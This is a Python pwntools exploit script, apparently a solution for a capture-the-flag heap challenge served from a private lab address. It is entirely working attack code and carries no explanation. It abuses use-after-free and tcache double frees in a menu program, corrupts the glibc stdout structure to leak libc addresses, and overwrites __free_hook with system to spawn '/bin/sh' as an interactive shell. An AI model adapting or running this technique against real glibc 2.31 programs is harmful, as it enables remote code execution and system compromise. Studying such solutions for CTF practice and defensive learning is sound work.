from pwn import *
context.log_level = 'debug'

def add(id,size,content):
	p.sendlineafter("Todo:\n",str(1))
	p.sendlineafter("Which Bag You Want To Store The Item?\n",str(id))
	p.sendlineafter("How Large Is This Item:\n",str(size))
	p.sendafter("Put the item:\n",content)
def edit(id,content):
	p.sendlineafter("Todo:\n",str(2))
	p.sendlineafter("Change?\n",str(id))
	p.sendafter("item:\n",content)
def show(id):
	p.sendlineafter("Todo:\n",str(3))
	p.sendlineafter("talk:\n",str(id))
def delete(id):
	p.sendlineafter("Todo:\n",str(4))
	p.sendlineafter(":\n",str(id))




p = process("./pwn")
p = remote("172.20.2.7",26351)
libc = ELF('./libc-2.31.so')

stdout = libc.sym['_IO_2_1_stdout_']
print "stdout:",hex(stdout)


add(0,0x408,"ILoveC")	
add(1,0x408,"ILoveC")	
add(4,0xf8,'a')
add(2,0x68,"ILoveC")	


for _ in range(7):
	delete(0)
	edit(0,'a'*0x10)
delete(0)


show(0)
rand_num = u8(p.recvuntil("\x0a",drop=1)[-1])
print "rand_num:",hex(rand_num)
rand_num = rand_num^0xe0
low = 0xe0
high = u8(p.recvuntil("\x0a",drop=1)[-1])^rand_num
leak = (high<<8)+low
print "high:",hex(high),"\nlow:",hex(low),"\nleak:",hex(leak)
stdout_offer = leak + (0xd6a0-0xcbe0)-0x10
print "stdout_offer:",hex(stdout_offer)

edit(0,p8(stdout_offer&0xff)+p8(stdout_offer>>0x8))
add(0,0x408,"ILoveC")
add(3,0x408,p64(0x0FBAD1887) +p64(0)*3)


edit(3,p64(0)*2+p64(0x0FBAD1887) +p64(0)*3+p8(0))
leak_addr = u64(p.recvuntil("\x7f")[-6::].ljust(8,'\x00'))
print "leak_addr:",hex(leak_addr)
libc_addr = leak_addr - libc.sym['_IO_2_1_stdin_']
print "libc_addr:",hex(libc_addr)
free_hook = libc_addr + libc.sym['__free_hook']
print "free_hook:",hex(free_hook)
system_addr = libc_addr + libc.sym['system']
print "system_addr:",hex(system_addr)

delete(4)
edit(4,'a'*0x10)
delete(4)
edit(4,p64(free_hook))
add(5,0xf8,'a')
add(6,0xf8,'a')
edit(6,p64(system_addr))



#gdb.attach(p,"b *$rebase(0x1667)")
#raw_input()
edit(2,'/bin/sh\x00')
delete(2)


p.interactive()